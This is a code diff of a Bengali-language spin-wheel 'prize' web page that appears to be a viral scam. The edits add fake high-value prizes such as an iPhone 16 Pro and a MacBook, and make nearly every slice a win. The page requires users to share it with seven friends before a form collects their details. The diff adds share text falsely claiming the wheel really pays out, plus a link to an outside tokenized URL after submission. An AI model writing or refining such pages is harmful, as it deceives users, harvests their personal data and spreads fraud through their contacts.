@@ -12,11 +12,11 @@
 
     <style>
         :root {
-            --primary-color: #ff6347; /* Tomato */
-            --secondary-color: #4682b4; /* SteelBlue */
-            --success-color: #32cd32; /* LimeGreen */
-            --background-start: #e0c3fc;
-            --background-end: #8ec5fc;
+            --primary-color: #ff6347;
+            --secondary-color: #4682b4;
+            --success-color: #32cd32;
+            --background-start: #ff7e5f;
+            --background-end: #feb47b;
         }
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body, html {
@@ -28,7 +28,8 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
+            overflow-x: hidden;
+            overflow-y: auto;
         }
         @keyframes gradientAnimation {
             0% { background-position: 0% 50%; }
@@ -41,6 +42,7 @@
             padding: 20px;
             width: 90%;
             max-width: 500px;
+            margin: 20px 0;
         }
         h1, h2 {
             font-family: 'Lobster', cursive;
@@ -80,7 +82,7 @@
             text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
         }
         #spinBtn { background-color: var(--secondary-color); }
-        #spinBtn:hover, .claim-btn:hover { transform: translateY(-3px) scale(1.05); }
+        #spinBtn:hover, .claim-btn:hover, .ok-btn:hover { transform: translateY(-3px) scale(1.05); }
         #spinBtn:disabled { background-color: #a0a0a0; cursor: not-allowed; transform: none; box-shadow: none; }
 
         .share-locker-container, .form-container, .thank-you-container {
@@ -112,7 +114,12 @@
         .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); justify-content: center; align-items: center; }
         .modal-content { background: white; padding: 40px; border-radius: 20px; text-align: center; animation: fadeIn 0.5s ease; width: 90%; max-width: 400px; }
         @keyframes fadeIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
-        #prizeIcon { font-size: 5em; color: var(--secondary-color); margin-bottom: 15px; }
+        
+        #prizeIcon {
+            font-size: 5em;
+            color: var(--secondary-color);
+            margin-bottom: 15px;
+        }
         #prizeText { font-size: 1.8em; font-weight: 700; color: #333; }
         .claim-btn { background-color: var(--success-color); }
     </style>
@@ -122,6 +129,7 @@
     <div class="main-wrapper" id="mainWrapper">
         <div id="wheelSection">
             <h1>আপনার ভাগ্য পরীক্ষা করুন!</h1>
+
             <div class="wheel-container"><canvas id="wheelCanvas" width="500" height="500"></canvas><div class="pointer"></div></div>
             <button id="spinBtn" class="btn" disabled>লোড হচ্ছে...</button>
         </div>
@@ -148,13 +156,17 @@
             <i class="fas fa-check-circle thank-you-icon"></i>
             <h2>ধন্যবাদ!</h2>
             <p>আপনার তথ্য জমা হয়েছে। আপনার পুরস্কার আগামী ৭২ ঘণ্টার মধ্যে আপনার ঠিকানায় পৌঁছে দেওয়া হবে।</p>
+            <a href="https://remarkillustration.com/vsnrrkqbrb?key=875a394a0867b7d59e2cb13e1f009402" target="_blank" class="btn ok-btn" style="background-color: var(--secondary-color); margin-top: 25px; display: inline-block; text-decoration: none;">ঠিক আছে</a>
         </div>
     </div>
     
     <div id="resultModal" class="modal">
         <div class="modal-content">
             <h2 id="modalTitle">অভিনন্দন!</h2><p id="modalSubtitle">আপনি জিতেছেন:</p>
-            <div><i id="prizeIcon" class=""></i><span id="prizeText"></span></div><br>
+            <div>
+                <i id="prizeIcon" class=""></i>
+                <p id="prizeText"></p>
+            </div><br>
             <button id="claimBtn" class="btn claim-btn">পুরস্কার সংগ্রহ করুন!</button>
         </div>
     </div>
@@ -169,22 +181,119 @@
         const resultModal = document.getElementById('resultModal'), prizeIcon = document.getElementById('prizeIcon'), prizeText = document.getElementById('prizeText'), claimBtn = document.getElementById('claimBtn'), modalTitle = document.getElementById('modalTitle'), modalSubtitle = document.getElementById('modalSubtitle');
         
         let shareCount = 0; const requiredShares = 7;
+        
+        // --- Corrected Labels and Icons ---
         const segments = [
-            { label: 'স্মার্ট ওয়াচ', iconUnicode: '\uf2f2', iconClass: 'fa-solid fa-stopwatch', isWinner: true }, { label: 'আবার চেষ্টা করুন', iconUnicode: '\uf119', iconClass: 'fa-solid fa-face-frown', isWinner: false },
-            { label: 'রাইস কুকার', iconUnicode: '\ue4c6', iconClass: 'fa-solid fa-bowl-food', isWinner: true }, { label: 'বাটন ফোন', iconUnicode: '\uf3ce', iconClass: 'fa-solid fa-mobile', isWinner: true },
-            { label: 'সেলাই মেশিন', iconUnicode: '\uf0c4', iconClass: 'fa-solid fa-scissors', isWinner: true }, { label: 'স্মার্টফোন', iconUnicode: '\uf3cd', iconClass: 'fa-solid fa-mobile-screen-button', isWinner: true },
-            { label: 'ফ্যান', iconUnicode: '\uf863', iconClass: 'fa-solid fa-fan', isWinner: true }, { label: 'টর্চলাইট', iconUnicode: '\uf0eb', iconClass: 'fa-solid fa-lightbulb', isWinner: true },
+            { label: 'স্মার্ট ওয়াচ', iconUnicode: '\uf2f2', iconClass: 'fa-solid fa-stopwatch', isWinner: true }, 
+            { label: 'Laptop', iconUnicode: '\uf109', iconClass: 'fa-solid fa-laptop', isWinner: true },
+            { label: 'রাইস কুকার', iconUnicode: '\ue4c6', iconClass: 'fa-solid fa-bowl-food', isWinner: true },
+            { label: 'MacBook', iconUnicode: '\uf109', iconClass: 'fa-solid fa-laptop', isWinner: true },
+            { label: 'সেলাই মেশিন', iconUnicode: '\uf0c4', iconClass: 'fa-solid fa-scissors', isWinner: true }, 
+            { label: 'iPhone 16 Pro', iconUnicode: '\uf3cd', iconClass: 'fa-solid fa-mobile-screen-button', isWinner: true }, 
+            { label: 'ফ্যান', iconUnicode: '\uf863', iconClass: 'fa-solid fa-fan', isWinner: true }, 
+            { label: 'Smart TV', iconUnicode: '\uf26c', iconClass: 'fa-solid fa-tv', isWinner: true },
+            { label: 'আবার চেষ্টা করুন', iconUnicode: '\uf119', iconClass: 'fa-solid fa-face-frown', isWinner: false },
+            { label: 'বাটন ফোন', iconUnicode: '\uf3ce', iconClass: 'fa-solid fa-mobile', isWinner: true },
+            { label: 'স্মার্টফোন', iconUnicode: '\uf3cd', iconClass: 'fa-solid fa-mobile-screen-button', isWinner: true },
+            { label: 'টর্চলাইট', iconUnicode: '\uf0eb', iconClass: 'fa-solid fa-lightbulb', isWinner: true },
         ];
         
         const segmentCount = segments.length, segmentAngle = 2 * Math.PI / segmentCount;
         let currentRotation = 0, spinning = false;
 
-        function drawWheel() { const radius = canvas.width / 2; ctx.clearRect(0, 0, canvas.width, canvas.height); ctx.save(); ctx.translate(radius, radius); ctx.rotate(currentRotation); segments.forEach((segment, i) => { const colors = ['#FFD700', '#f08080', '#90ee90', '#add8e6', '#ffb6c1', '#dda0dd', '#afeeee', '#ffa500']; const angle = i * segmentAngle; ctx.beginPath(); ctx.fillStyle = colors[i]; ctx.moveTo(0, 0); ctx.arc(0, 0, radius, angle, angle + segmentAngle); ctx.lineTo(0, 0); ctx.fill(); ctx.save(); const textAngle = angle + segmentAngle / 2; ctx.rotate(textAngle); ctx.fillStyle = 'black'; ctx.font = '900 40px "Font Awesome 6 Free"'; ctx.textAlign = 'center'; ctx.fillText(segment.iconUnicode, radius * 0.65, -10); ctx.font = 'bold 16px Montserrat'; ctx.fillText(segment.label, radius * 0.65, 30); ctx.restore(); }); ctx.restore(); }
+        function drawWheel() { 
+            const radius = canvas.width / 2; 
+            ctx.clearRect(0, 0, canvas.width, canvas.height); 
+            ctx.save(); 
+            ctx.translate(radius, radius); 
+            ctx.rotate(currentRotation); 
+            segments.forEach((segment, i) => { 
+                const colors = ['#FFD700', '#8a2be2', '#f08080', '#dc143c', '#90ee90', '#ff8c00', '#add8e6', '#00ced1', '#ffb6c1', '#dda0dd', '#afeeee', '#ffa500'];
+                const angle = i * segmentAngle; 
+                ctx.beginPath(); 
+                ctx.fillStyle = colors[i % colors.length];
+                ctx.moveTo(0, 0); 
+                ctx.arc(0, 0, radius, angle, angle + segmentAngle); 
+                ctx.lineTo(0, 0); 
+                ctx.fill(); 
+                ctx.save(); 
+
+                const textAngle = angle + segmentAngle / 2; 
+                ctx.rotate(textAngle); 
+                
+                ctx.textAlign = 'center';
+                ctx.textBaseline = 'middle';
+                ctx.fillStyle = 'black';
+                
+                // --- Corrected and Centered Positioning Logic ---
+                const iconY = -20;
+                const labelY = 20;
+                const distance = radius * 0.65;
+
+                // Draw main icon
+                ctx.font = '900 35px "Font Awesome 6 Free"';
+                ctx.fillText(segment.iconUnicode, distance, iconY);
+
+                // Draw label
+                ctx.font = 'bold 14px Montserrat'; 
+                ctx.fillText(segment.label, distance, labelY);
+                
+                ctx.restore(); 
+            }); 
+            ctx.restore(); 
+        }
+
         function spin() { if (spinning) return; spinning = true; spinBtn.disabled = true; const randomSpins = Math.floor(Math.random() * 5) + 8; const targetAngle = Math.random() * 2 * Math.PI; const totalRotation = randomSpins * 2 * Math.PI + targetAngle; canvas.style.transform = `rotate(${totalRotation}rad)`; setTimeout(() => { spinning = false; spinBtn.disabled = false; canvas.style.transition = 'none'; const finalRotation = totalRotation % (2 * Math.PI); canvas.style.transform = `rotate(${finalRotation}rad)`; currentRotation = finalRotation; showPrize(); }, 6000); }
-        function showPrize() { const degrees = currentRotation * 180 / Math.PI; const normalizedDegrees = (360 - degrees % 360 + 270) % 360; const segmentSize = 360 / segmentCount; const winningIndex = Math.floor(normalizedDegrees / segmentSize); const prize = segments[winningIndex]; prizeIcon.className = prize.iconClass; prizeText.textContent = prize.label; if (prize.isWinner) { modalTitle.textContent = 'অভিনন্দন!'; modalSubtitle.textContent = 'আপনি জিতেছেন:'; claimBtn.textContent = 'পুরস্কার সংগ্রহ করুন!'; claimBtn.onclick = () => { resultModal.style.display = 'none'; wheelSection.style.display = 'none'; shareLocker.style.display = 'block'; shareCount = 0; unlockFormBtn.disabled = true; unlockFormBtn.textContent = 'ফর্মটি আনলক করতে শেয়ার করুন'; updateShareProgress(); }; } else { modalTitle.textContent = 'দুঃখিত!'; modalSubtitle.textContent = 'চাকাটি থেমেছে এখানে:'; claimBtn.textContent = 'আবার চেষ্টা করুন'; claimBtn.onclick = () => { resultModal.style.display = 'none'; }; } resultModal.style.display = 'flex'; }
+        
+        function showPrize() { 
+            const degrees = currentRotation * 180 / Math.PI; 
+            const normalizedDegrees = (360 - degrees % 360 + 270) % 360; 
+            const segmentSize = 360 / segmentCount; 
+            const winningIndex = Math.floor(normalizedDegrees / segmentSize); 
+            const prize = segments[winningIndex]; 
+            
+            prizeText.textContent = prize.label;
+            prizeIcon.className = prize.iconClass;
+
+            if (prize.isWinner) { 
+                modalTitle.textContent = 'অভিনন্দন!'; 
+                modalSubtitle.textContent = 'আপনি জিতেছেন:'; 
+                claimBtn.textContent = 'পুরস্কার সংগ্রহ করুন!'; 
+                claimBtn.onclick = () => { resultModal.style.display = 'none'; wheelSection.style.display = 'none'; shareLocker.style.display = 'block'; shareCount = 0; unlockFormBtn.disabled = true; unlockFormBtn.textContent = 'ফর্মটি আনলক করতে শেয়ার করুন'; updateShareProgress(); }; 
+            } else { 
+                modalTitle.textContent = 'দুঃখিত!'; 
+                modalSubtitle.textContent = 'চাকাটি থেমেছে এখানে:'; 
+                claimBtn.textContent = 'আবার চেষ্টা করুন'; 
+                claimBtn.onclick = () => { resultModal.style.display = 'none'; }; 
+            } 
+            resultModal.style.display = 'flex'; 
+        }
+
         function updateShareProgress() { shareProgress.textContent = `${shareCount}/${requiredShares} জন বন্ধুকে শেয়ার করেছেন।`; if (shareCount >= requiredShares) { unlockFormBtn.disabled = false; unlockFormBtn.textContent = 'আমি শেয়ার করেছি, ফর্মটি আনলক করুন'; } }
-        shareButtons.forEach(button => { button.addEventListener('click', function(e) { e.preventDefault(); if (shareCount < requiredShares) { shareCount++; updateShareProgress(); } const pageUrl = window.location.href, shareText = encodeURIComponent("এই মজার স্পিন হুইলটি খেলে পুরস্কার জিতুন! 🤩"); let shareUrl = ''; const app = this.getAttribute('data-app'); if (app === 'whatsapp') shareUrl = `https://api.whatsapp.com/send?text=${shareText}%20${encodeURIComponent(pageUrl)}`; else if (app === 'messenger') shareUrl = `https://www.facebook.com/dialog/send?app_id=145634995501895&link=${encodeURIComponent(pageUrl)}&redirect_uri=${encodeURIComponent(pageUrl)}`; else if (app === 'telegram') shareUrl = `https://t.me/share/url?url=${encodeURIComponent(pageUrl)}&text=${shareText}`; window.open(shareUrl, '_blank'); }); });
+        
+        shareButtons.forEach(button => { 
+            button.addEventListener('click', function(e) { 
+                e.preventDefault(); 
+                if (shareCount < requiredShares) { 
+                    shareCount++; 
+                    updateShareProgress(); 
+                } 
+                const pageUrl = window.location.href;
+                // --- Alluring Share Message ---
+                const shareText = encodeURIComponent("এই স্পিন হুইলটি সত্যি পুরস্কার দিচ্ছে! আমার ভাগ্য খুলে গেছে, এবার আপনার পালা। এখনই চেষ্টা করে দেখুন! 🎉🎁");
+                
+                let shareUrl = ''; 
+                const app = this.getAttribute('data-app'); 
+                if (app === 'whatsapp') shareUrl = `https://api.whatsapp.com/send?text=${shareText}%20${encodeURIComponent(pageUrl)}`; 
+                else if (app === 'messenger') shareUrl = `https://www.facebook.com/dialog/send?app_id=145634995501895&link=${encodeURIComponent(pageUrl)}&redirect_uri=${encodeURIComponent(pageUrl)}`; 
+                else if (app === 'telegram') shareUrl = `https://t.me/share/url?url=${encodeURIComponent(pageUrl)}&text=${shareText}`; 
+                
+                window.open(shareUrl, '_blank'); 
+            }); 
+        });
+
         unlockFormBtn.addEventListener('click', () => { shareLocker.style.display = 'none'; formContainer.style.display = 'block'; });
+        
         prizeForm.addEventListener('submit', (e) => {
             e.preventDefault();
             submitBtn.disabled = true; submitBtn.textContent = 'জমা হচ্ছে...';
@@ -201,9 +310,17 @@
                     submitBtn.disabled = false; submitBtn.textContent = 'জমা দিন';
                 });
         });
+
         function triggerFireworks() { const duration = 5 * 1000, animationEnd = Date.now() + duration, defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 }; function randomInRange(min, max) { return Math.random() * (max - min) + min; } const interval = setInterval(function() { const timeLeft = animationEnd - Date.now(); if (timeLeft <= 0) return clearInterval(interval); const particleCount = 50 * (timeLeft / duration); confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } })); confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } })); }, 250); }
-        document.fonts.ready.then(() => { drawWheel(); spinBtn.disabled = false; spinBtn.textContent = 'SPIN'; });
+        
+        document.fonts.ready.then(() => {
+            drawWheel();
+            spinBtn.disabled = false;
+            spinBtn.textContent = 'SPIN';
+        });
+
         spinBtn.addEventListener('click', spin);
     </script>
+
 </body>
 </html>
